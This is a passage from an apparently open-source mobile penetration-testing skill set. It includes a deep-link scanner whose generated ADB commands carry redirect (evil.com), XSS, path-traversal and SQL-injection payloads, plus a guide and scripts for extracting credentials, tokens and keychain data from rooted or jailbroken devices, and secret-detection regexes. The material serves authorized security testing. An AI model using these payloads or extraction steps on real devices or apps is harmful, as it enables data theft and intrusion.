                "severity": "MEDIUM",
                "description": "Activity matches all paths - wide attack surface",
            })

        # Browsable without verified links
        if link["browsable"] and link["scheme"] not in ("http", "https"):
            issues.append({
                "issue": "browsable_custom_scheme",
                "severity": "MEDIUM",
                "description": "Browsable intent with custom scheme invocable from web browsers",
            })

        if issues:
            findings.append({
                "deep_link": link["url"],
                "activity": link["activity"],
                "issues": issues,
            })

    return findings


def generate_test_commands(deep_links: list, package: str) -> list:
    """Generate ADB commands for testing deep links."""
    commands = []
    injection_payloads = [
        ("redirect_test", "?redirect=https://evil.com"),
        ("xss_test", "?q=<script>alert(1)</script>"),
        ("path_traversal", "/../../../etc/passwd"),
        ("sql_injection", "?id=1' OR '1'='1"),
    ]

    for link in deep_links:
        base_url = link["url"]

        # Basic invocation
        commands.append({
            "name": f"invoke_{link['activity']}",
            "command": f'adb shell am start -a android.intent.action.VIEW -d "{base_url}" {package}',
            "type": "basic",
        })

        # Injection tests
        for test_name, payload in injection_payloads:
            commands.append({
                "name": f"{test_name}_{link['activity']}",
                "command": f'adb shell am start -a android.intent.action.VIEW -d "{base_url}{payload}" {package}',
                "type": test_name,
            })

    return commands


def main():
    parser = argparse.ArgumentParser(description="Deep Link Vulnerability Scanner")
    parser.add_argument("--manifest", required=True, help="Path to AndroidManifest.xml")
    parser.add_argument("--package", default="com.target.app", help="Package name")
    parser.add_argument("--output", default="deeplink_report.json", help="Output report")
    args = parser.parse_args()

    if not Path(args.manifest).exists():
        print(f"[-] File not found: {args.manifest}")
        sys.exit(1)

    print("[*] Extracting deep links...")
    deep_links = extract_deep_links(args.manifest)
    print(f"[+] Found {len(deep_links)} deep link definitions")

    print("[*] Assessing security...")
    findings = assess_deep_link_security(deep_links)

    print("[*] Generating test commands...")
    commands = generate_test_commands(deep_links, args.package)

    report = {
        "scan": {
            "manifest": args.manifest,
            "package": args.package,
            "date": datetime.now().isoformat(),
        },
        "deep_links": deep_links,
        "findings": findings,
        "test_commands": commands,
        "summary": {
            "total_deep_links": len(deep_links),
            "total_findings": len(findings),
            "test_commands_generated": len(commands),
        },
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"[+] Report saved: {args.output}")
    for f in findings:
        for issue in f["issues"]:
            print(f"    [{issue['severity']}] {f['deep_link']}: {issue['issue']}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/SKILL.md =====
---
name: exploiting-insecure-data-storage-in-mobile
description: 'Identifies and exploits insecure local data storage vulnerabilities
  in Android and iOS mobile applications including unencrypted databases, world-readable
  files, insecure SharedPreferences, plaintext credential storage, and improper keychain/keystore
  usage. Use when performing mobile penetration testing focused on OWASP M9 (Insecure
  Data Storage) or assessing compliance with MASVS-STORAGE requirements. Activates
  for requests involving mobile data storage security, local storage exploitation,
  SharedPreferences analysis, or mobile data leakage assessment.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- data-storage
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
atlas_techniques:
- AML.T0057
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
- GOVERN-1.1
- GOVERN-4.2
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1003
---
# Exploiting Insecure Data Storage in Mobile

## When to Use

Use this skill when:
- Assessing whether mobile applications store sensitive data securely on the device filesystem
- Testing for credential leakage through SharedPreferences, SQLite databases, or plists
- Evaluating keychain/keystore implementation for proper access control attributes
- Performing data-at-rest security assessment during mobile penetration tests

**Do not use** this skill on production user devices without authorization -- data extraction techniques require physical access or root/jailbreak privileges.

## Prerequisites

- Rooted Android device or emulator with ADB access
- Jailbroken iOS device with SSH access or Objection-patched IPA
- ADB (Android Debug Bridge) for Android filesystem access
- SQLite3 CLI for database inspection
- Frida/Objection for runtime data extraction
- Target application installed and exercised (logged in, data cached)


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Map Application Data Storage Locations

**Android storage paths:**
```bash
# Internal storage (app-private, requires root)
/data/data/<package_name>/
├── shared_prefs/      # SharedPreferences XML files
├── databases/         # SQLite databases
├── files/             # General files
├── cache/             # Cached data
├── lib/               # Native libraries
└── app_webview/       # WebView data

# External storage (world-readable on older Android)
/sdcard/Android/data/<package_name>/

# Check for world-readable files
adb shell run-as <package_name> ls -la /data/data/<package_name>/
```

**iOS storage paths:**
```bash
# App sandbox (accessible via SSH on jailbroken device)
/var/mobile/Containers/Data/Application/<UUID>/
├── Documents/         # User data, backed up by default
├── Library/
│   ├── Preferences/   # NSUserDefaults plists
│   ├── Caches/        # Cache data
│   └── Application Support/
└── tmp/               # Temporary files
```

### Step 2: Extract and Analyze SharedPreferences (Android)

```bash
# Pull SharedPreferences files
adb shell run-as <package_name> cat shared_prefs/*.xml

# Or on rooted device
adb pull /data/data/<package_name>/shared_prefs/ ./shared_prefs/

# Search for sensitive data
grep -ri "password\|token\|secret\|key\|session\|auth\|cookie" shared_prefs/
```

Common insecure storage patterns:
```xml
<!-- Plaintext credentials -->
<string name="user_password">mysecretpass123</string>
<string name="auth_token">eyJhbGciOiJIUzI1NiIs...</string>
<string name="api_key">sk-live-abc123def456</string>

<!-- Sensitive PII -->
<string name="user_ssn">123-45-6789</string>
<string name="credit_card">4111111111111111</string>
```

### Step 3: Analyze SQLite Databases

```bash
# Pull databases
adb pull /data/data/<package_name>/databases/ ./databases/

# Open and inspect
sqlite3 databases/app.db
.tables
.schema users
SELECT * FROM users;
SELECT * FROM sessions;
SELECT * FROM tokens;

# Search all tables for sensitive columns
sqlite3 databases/app.db ".dump" | grep -i "password\|token\|secret\|credit"
```

Check for unencrypted SQLCipher databases:
```bash
# If database opens without password, it's unencrypted
sqlite3 databases/app.db "SELECT count(*) FROM sqlite_master;"
# Success = unencrypted (vulnerability)
```

### Step 4: Inspect iOS Keychain Storage

```bash
# Using Objection
objection --gadget com.target.app explore
ios keychain dump

# Check protection class attributes
# kSecAttrAccessibleWhenUnlocked - OK for most data
# kSecAttrAccessibleAlways - VULNERABLE: accessible even when locked
# kSecAttrAccessibleAfterFirstUnlock - acceptable for background apps
```

### Step 5: Assess External Storage and Backup Exposure

**Android:**
```bash
# Check if backup is enabled
aapt dump badging target.apk | grep -i "allowBackup"
# android:allowBackup="true" = vulnerability

# Extract backup data
adb backup -f backup.ab -apk <package_name>
java -jar abe.jar unpack backup.ab backup.tar
tar xvf backup.tar
# Inspect extracted data for sensitive information

# Check external storage
adb shell ls -la /sdcard/Android/data/<package_name>/
```

**iOS:**
```bash
# Check backup exclusion
# Files in Documents/ are backed up by default
# Check NSURLIsExcludedFromBackupKey attribute
objection --gadget com.target.app explore
ios plist cat Info.plist
```

### Step 6: Runtime Memory Analysis

```bash
# Dump process memory for sensitive data
objection --gadget com.target.app explore
memory search "password" --string
memory search "BEGIN RSA PRIVATE KEY" --string
memory dump all /tmp/memdump/

# Android: Check for sensitive data in logs
adb logcat -d | grep -i "password\|token\|key\|secret"
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **SharedPreferences** | Android key-value storage in XML format; often misused for storing credentials in plaintext |
| **Keychain Services** | iOS secure credential storage backed by Secure Enclave hardware on modern devices |
| **Android Keystore** | Hardware-backed cryptographic key storage on Android; keys cannot be extracted from the device |
| **SQLCipher** | Transparent encryption extension for SQLite databases; prevents data extraction without password |
| **Data Protection API** | iOS file-level encryption tied to device passcode; controlled via protection class attributes |

## Tools & Systems

- **ADB (Android Debug Bridge)**: Command-line tool for Android device interaction and filesystem access
- **Objection**: Frida-powered runtime exploration for keychain dumping and memory inspection
- **SQLite3**: Command-line interface for inspecting unencrypted SQLite databases
- **Android Backup Extractor (ABE)**: Tool for unpacking ADB backup files to inspect stored data
- **iExplorer**: GUI tool for browsing iOS app sandbox filesystem

## Common Pitfalls

- **Encrypted but key in code**: Some apps encrypt databases but store the encryption key in SharedPreferences or hardcoded in the binary. Always check for key storage alongside encryption.
- **MODE_WORLD_READABLE deprecation**: This flag was deprecated in API 17, but legacy apps may still use it, making SharedPreferences readable by other apps.
- **iOS backup scope**: By default, all files in the Documents directory are included in iTunes/iCloud backups. Verify that sensitive files have the backup exclusion attribute set.
- **Clipboard exposure**: Data copied to clipboard is accessible to all apps. Check if the app copies sensitive data (passwords, tokens) to the clipboard.

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/assets/template.md =====
# Insecure Data Storage Assessment Report

## Target Application

| Field | Value |
|-------|-------|
| Application | [APP_NAME] |
| Platform | [Android/iOS] |
| Package/Bundle ID | [ID] |
| Assessment Date | [DATE] |
| Device State | [Rooted/Jailbroken] |

## Storage Analysis Summary

| Storage Type | Items Found | Sensitive Data | Encrypted | Risk |
|-------------|------------|----------------|-----------|------|
| SharedPreferences/Plists | [N] | [YES/NO] | [YES/NO] | [RISK] |
| SQLite Databases | [N] | [YES/NO] | [YES/NO] | [RISK] |
| Files on Disk | [N] | [YES/NO] | [YES/NO] | [RISK] |
| Keychain/Keystore | [N] | [YES/NO] | [YES/NO] | [RISK] |
| Backup Data | [N] | [YES/NO] | [YES/NO] | [RISK] |

## Detailed Findings

### Finding [N]: [TITLE]

- **Severity**: [CRITICAL/HIGH/MEDIUM/LOW]
- **OWASP Mobile**: M9 - Insecure Data Storage
- **CWE**: [CWE-ID]
- **Storage Location**: [PATH]
- **Data Type**: [credentials/PII/tokens/keys]
- **Encrypted**: [YES/NO]
- **Evidence**: [SANITIZED_SAMPLE]
- **Recommendation**: [REMEDIATION]

## Recommendations

### Immediate Actions
1. [RECOMMENDATION]

### Short-Term Improvements
1. [RECOMMENDATION]

### Long-Term Architecture Changes
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/references/api-reference.md =====
# API Reference: Insecure Mobile Data Storage Detection

## OWASP Mobile Top 10 — M9: Insecure Data Storage

### Risk Areas
| Storage Type | Platform | Risk |
|-------------|----------|------|
| SharedPreferences | Android | HIGH (plaintext XML) |
| SQLite databases | Both | CRITICAL if unencrypted |
| Keychain (improper) | iOS | MEDIUM |
| External storage | Android | HIGH (world-readable) |
| Plist files | iOS | HIGH (plaintext) |

## Android Data Locations

### App Private Storage
```
/data/data/<package>/shared_prefs/    # SharedPreferences XML
/data/data/<package>/databases/        # SQLite databases
/data/data/<package>/files/            # App files
/data/data/<package>/cache/            # Cache data
```

### External Storage (World-Readable)
```
/sdcard/Android/data/<package>/
```

## ADB Commands

### Pull App Data
```bash
adb pull /data/data/com.target.app/ ./extracted/
```

### List SharedPreferences
```bash
adb shell run-as com.target.app ls /data/data/com.target.app/shared_prefs/
```

### Read SharedPreferences
```bash
adb shell run-as com.target.app cat shared_prefs/credentials.xml
```

## SQLite Analysis

### Python sqlite3
```python
import sqlite3
conn = sqlite3.connect("app.db")
cursor = conn.cursor()
cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
for table in cursor.fetchall():
    cursor.execute(f"PRAGMA table_info({table[0]})")
    print(cursor.fetchall())
```

## iOS Data Locations

### App Sandbox
```
/var/mobile/Containers/Data/Application/<UUID>/
    Documents/
    Library/Preferences/     # NSUserDefaults (plist)
    Library/Caches/
    tmp/
```

### Keychain
```bash
# Using keychain-dumper
./keychain-dumper -a
```

## Frida Scripts for Data Storage Audit

### Hook SharedPreferences (Android)
```javascript
Java.perform(function() {
    var sp = Java.use("android.app.SharedPreferencesImpl$EditorImpl");
    sp.putString.implementation = function(key, value) {
        console.log("SharedPrefs PUT: " + key + " = " + value);
        return this.putString(key, value);
    };
});
```

### Hook NSUserDefaults (iOS)
```javascript
var NSUserDefaults = ObjC.classes.NSUserDefaults;
var orig = NSUserDefaults["- setObject:forKey:"];
Interceptor.attach(orig.implementation, {
    onEnter: function(args) {
        console.log("NSUserDefaults: " + ObjC.Object(args[3]) + " = " + ObjC.Object(args[2]));
    }
});
```

## Secure Storage Alternatives

| Platform | Secure Method |
|----------|---------------|
| Android | EncryptedSharedPreferences, Android Keystore |
| iOS | Keychain Services with kSecAttrAccessible |
| Both | SQLCipher for encrypted databases |

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/references/standards.md =====
# Standards Reference: Insecure Data Storage in Mobile

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | Data Storage Relevance |
|----------|------|----------------------|
| M1 | Improper Credential Usage | Hardcoded credentials in SharedPreferences, plists, databases |
| M6 | Inadequate Privacy Controls | PII stored unencrypted, accessible via backup extraction |
| M8 | Security Misconfiguration | allowBackup=true, world-readable files, missing encryption |
| M9 | Insecure Data Storage | Primary focus: all local storage vulnerabilities |
| M10 | Insufficient Cryptography | Weak encryption of local databases, hardcoded keys |

## OWASP MASVS v2.0 - MASVS-STORAGE Controls

| Control | Description | Test Method |
|---------|-------------|-------------|
| MASVS-STORAGE-1 | App securely stores sensitive data | Inspect SharedPreferences, keychain, databases |
| MASVS-STORAGE-2 | App prevents sensitive data leakage | Check logs, clipboard, backups, screenshots |

## NIST SP 800-163 Rev 1 - Mobile App Vetting

- Section 4.3.1: Data storage analysis for sensitive information at rest
- Section 4.3.2: Verification of encryption implementation for stored data
- Section 5.2: Data protection requirements for enterprise mobile apps

## CWE Mappings

| CWE ID | Title | Storage Type |
|--------|-------|-------------|
| CWE-312 | Cleartext Storage of Sensitive Information | SharedPreferences, plists, SQLite |
| CWE-316 | Cleartext Storage in Memory | Process memory, clipboard |
| CWE-359 | Exposure of Private Personal Information | PII in unencrypted databases |
| CWE-522 | Insufficiently Protected Credentials | Passwords in SharedPreferences |
| CWE-532 | Information Exposure Through Log Files | Sensitive data in logcat/syslog |
| CWE-921 | Storage of Sensitive Data in Unprotected Mechanism | External storage, world-readable |
| CWE-922 | Insecure Storage of Sensitive Information | General insecure storage |

## Android Keystore Best Practices

| Practice | Secure | Insecure |
|----------|--------|----------|
| Key storage | Android Keystore (hardware-backed) | Hardcoded in APK or SharedPreferences |
| Database encryption | SQLCipher with Keystore-derived key | Unencrypted SQLite |
| Shared Preferences | EncryptedSharedPreferences (Jetpack) | MODE_PRIVATE without encryption |
| File encryption | AES-256-GCM with Keystore key | Plaintext files in internal storage |

## iOS Data Protection Classes

| Class | When Accessible | Use Case |
|-------|----------------|----------|
| NSFileProtectionComplete | Only when unlocked | Highly sensitive data |
| NSFileProtectionCompleteUnlessOpen | While open/unlocked | Files written in background |
| NSFileProtectionCompleteUntilFirstUserAuthentication | After first unlock | Background-accessible data |
| NSFileProtectionNone | Always | Non-sensitive cached data |

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/references/workflows.md =====
# Workflows: Exploiting Insecure Data Storage in Mobile

## Workflow 1: Android Data Storage Assessment

```
[Install & exercise app] --> [Root/ADB access] --> [Extract internal storage]
                                                          |
                                       +------------------+------------------+
                                       |                  |                  |
                              [SharedPreferences]   [SQLite DBs]      [File system]
                              [Grep for secrets]    [Open & query]    [Check permissions]
                              [Check encryption]    [Check SQLCipher] [External storage]
                                       |                  |                  |
                                       +------------------+------------------+
                                                          |
                                                   [Backup extraction]
                                                   [ADB backup test]
                                                          |
                                                   [Memory analysis]
                                                   [Logcat review]
                                                          |
                                                   [Report findings]
```

## Workflow 2: iOS Data Storage Assessment

```
[Install & exercise app] --> [Jailbreak/Objection] --> [Extract sandbox data]
                                                              |
                                           +------------------+------------------+
                                           |                  |                  |
                                    [Keychain dump]    [Plist analysis]   [SQLite DBs]
                                    [Protection class] [NSUserDefaults]   [Core Data]
                                    [Access control]   [Sensitive values] [Encryption check]
                                           |                  |                  |
                                           +------------------+------------------+
                                                              |
                                                    [Backup inclusion check]
                                                    [Memory string search]
                                                    [Clipboard monitoring]
                                                              |
                                                    [Report findings]
```

## Decision Matrix: Data Storage Risk

| Storage Mechanism | Encrypted | Access Restricted | Backup Excluded | Risk Level |
|-------------------|-----------|-------------------|-----------------|------------|
| SharedPreferences (plaintext) | No | App-only | No | CRITICAL |
| EncryptedSharedPreferences | Yes | App-only | Depends | LOW |
| SQLite (no SQLCipher) | No | App-only | No | HIGH |
| SQLCipher (key in code) | Yes* | App-only | No | MEDIUM |
| Android Keystore | Yes | Hardware-backed | N/A | LOW |
| iOS Keychain (kSecAttrAccessibleAlways) | Yes | Always accessible | N/A | MEDIUM |
| iOS Keychain (complete protection) | Yes | When unlocked only | N/A | LOW |
| External storage | No | World-readable | N/A | CRITICAL |

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting insecure data storage in mobile applications."""

import argparse
import json
import os
import re
import subprocess
import sqlite3
from datetime import datetime, timezone


ANDROID_SENSITIVE_PATHS = [
    "/data/data/{package}/shared_prefs/",
    "/data/data/{package}/databases/",
    "/data/data/{package}/files/",
    "/data/data/{package}/cache/",
    "/sdcard/Android/data/{package}/",
]

_SAFE_TABLE_RE = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')

SENSITIVE_PATTERNS = {
    "api_key": re.compile(r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)', re.I),
    "token": re.compile(r'["\']?(?:access|auth|bearer)[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', re.I),
    "password": re.compile(r'["\']?password["\']?\s*[:=]\s*["\']([^"\']+)', re.I),
    "private_key": re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----'),
    "base64_cred": re.compile(r'["\']?(?:auth|credential)["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{20,})', re.I),
}


def scan_shared_prefs(prefs_dir):
    """Scan Android SharedPreferences XML files for sensitive data."""
    findings = []
    if not os.path.isdir(prefs_dir):
        return findings
    for fname in os.listdir(prefs_dir):
        if not fname.endswith(".xml"):
            continue
        fpath = os.path.join(prefs_dir, fname)
        try:
            with open(fpath, "r", errors="replace") as f:
                content = f.read()
            for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                matches = pattern.findall(content)
                if matches:
                    findings.append({
                        "file": fpath,
                        "type": "shared_prefs",
                        "pattern": pattern_name,
                        "match_count": len(matches),
                        "severity": "HIGH",
                    })
        except PermissionError:
            pass
    return findings


def scan_sqlite_databases(db_dir):
    """Scan SQLite databases for unencrypted sensitive data."""
    findings = []
    if not os.path.isdir(db_dir):
        return findings
    for fname in os.listdir(db_dir):
        if not fname.endswith((".db", ".sqlite", ".sqlite3")):
            continue
        fpath = os.path.join(db_dir, fname)
        try:
            conn = sqlite3.connect(fpath)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            for (table_name,) in tables:
                if not _SAFE_TABLE_RE.match(table_name):
                    continue
                cursor.execute(f"PRAGMA table_info([{table_name}])")
                columns = cursor.fetchall()
                sensitive_cols = []
                for col in columns:
                    col_name = col[1].lower()
                    for sf in ["password", "token", "secret", "key", "ssn", "credit"]:
                        if sf in col_name:
                            sensitive_cols.append(col[1])
                if sensitive_cols:
                    cursor.execute(f"SELECT COUNT(*) FROM [{table_name}]")
                    row_count = cursor.fetchone()[0]
                    findings.append({
                        "file": fpath,
                        "table": table_name,
                        "sensitive_columns": sensitive_cols,
                        "row_count": row_count,
                        "encrypted": False,
                        "severity": "CRITICAL",
                    })
            conn.close()
        except (sqlite3.Error, PermissionError):
            pass
    return findings


def scan_file_storage(files_dir):
    """Scan app file storage for sensitive data."""
    findings = []
    if not os.path.isdir(files_dir):
        return findings
    for root, _, files in os.walk(files_dir):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", errors="replace") as f:
                    content = f.read(4096)
                for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                    if pattern.search(content):
                        findings.append({
                            "file": fpath,
                            "pattern": pattern_name,
                            "severity": "HIGH",
                        })
            except (PermissionError, UnicodeDecodeError):
                pass
    return findings


def adb_pull_app_data(package_name, output_dir):
    """Pull application data via ADB for analysis."""
    os.makedirs(output_dir, exist_ok=True)
    paths = [p.format(package=package_name) for p in ANDROID_SENSITIVE_PATHS]
    results = []
    for path in paths:
        try:
            subprocess.check_output(
                ["adb", "pull", path, output_dir],
                text=True, errors="replace", timeout=15
            )
            results.append({"path": path, "status": "pulled"})
        except subprocess.SubprocessError:
            results.append({"path": path, "status": "failed"})
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Detect insecure data storage in mobile apps (authorized testing only)"
    )
    parser.add_argument("--scan-dir", help="Directory containing app data to scan")
    parser.add_argument("--package", help="Android package name for ADB pull")
    parser.add_argument("--pull-dir", default=os.environ.get("MOBILE_AUDIT_DIR", "/tmp/mobile_audit"))
    parser.add_argument("--output", "-o", help="Output JSON report")
    args = parser.parse_args()

    print("[*] Insecure Mobile Data Storage Detection Agent")
    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "findings": []}

    scan_dir = args.scan_dir or args.pull_dir
    if args.package:
        adb_pull_app_data(args.package, args.pull_dir)

    if os.path.isdir(scan_dir):
        report["findings"].extend(scan_shared_prefs(scan_dir))
        report["findings"].extend(scan_sqlite_databases(scan_dir))
        report["findings"].extend(scan_file_storage(scan_dir))

    critical = sum(1 for f in report["findings"] if f.get("severity") == "CRITICAL")
    report["risk_level"] = "CRITICAL" if critical else "HIGH" if report["findings"] else "LOW"
    print(f"[*] Findings: {len(report['findings'])} (CRITICAL: {critical})")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[*] Report saved to {args.output}")
    else:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/exploiting-insecure-data-storage-in-mobile/scripts/process.py =====
#!/usr/bin/env python3
"""
Mobile Data Storage Security Scanner

Analyzes extracted mobile app data directories for insecure storage patterns.
Scans SharedPreferences, SQLite databases, plists, and files for sensitive data.

Usage:
    python process.py --data-dir ./extracted_app_data [--platform android|ios] [--output report.json]
"""

import argparse
import json
import os
import re
import sqlite3
import sys
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path


SENSITIVE_PATTERNS = {
    "password": re.compile(r"(?:password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"<]+)", re.IGNORECASE),
    "api_key": re.compile(r"(?:api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{16,})", re.IGNORECASE),
    "token": re.compile(r"(?:auth[_-]?token|access[_-]?token|bearer)\s*[:=]\s*['\"]?([a-zA-Z0-9_.-]{16,})", re.IGNORECASE),
